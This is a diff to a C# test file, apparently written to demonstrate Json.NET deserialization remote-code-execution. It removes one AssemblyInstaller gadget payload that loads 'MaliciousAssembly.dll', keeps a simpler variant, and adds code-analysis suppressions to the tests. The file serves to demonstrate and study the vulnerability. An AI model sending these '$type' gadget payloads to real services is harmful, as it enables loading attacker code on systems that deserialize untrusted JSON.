@@ -15,13 +15,6 @@ namespace SerializationRCE
             }
         """;
 
-        string assemblyPayload = """
-                        {"$type":"System.Configuration.Install.AssemblyInstaller, 
-            System.Configuration.Install, Version=4.0.0.0, Culture=neutral, 
-            PublicKeyToken=b03f5f7f11d50a3a",
-            "Path":"MaliciousAssembly.dll"}           
-            """;
-
         string assemblyPayloadSimple = """
                         {"$type":"System.Configuration.Install.AssemblyInstaller, 
             System.Configuration.Install",
@@ -35,6 +28,7 @@ namespace SerializationRCE
             """;
 
         [Fact]
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0059:Unnecessary assignment of a value", Justification = "This is a test to demonstrate the vulnerability")]
         public void FileInfoJson()
         {
             JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
@@ -45,6 +39,7 @@ namespace SerializationRCE
 
 
         [Fact]
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0059:Unnecessary assignment of a value", Justification = "This is a test to demonstrate the vulnerability")]
         public void AssemblyLoaderJson()
         {
             JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
@@ -54,6 +49,7 @@ namespace SerializationRCE
         }
 
         [Fact]
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0059:Unnecessary assignment of a value", Justification = "This is a test to demonstrate the vulnerability")]
         public void MaliciousAssemblyLauncherJson()
         {
             JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
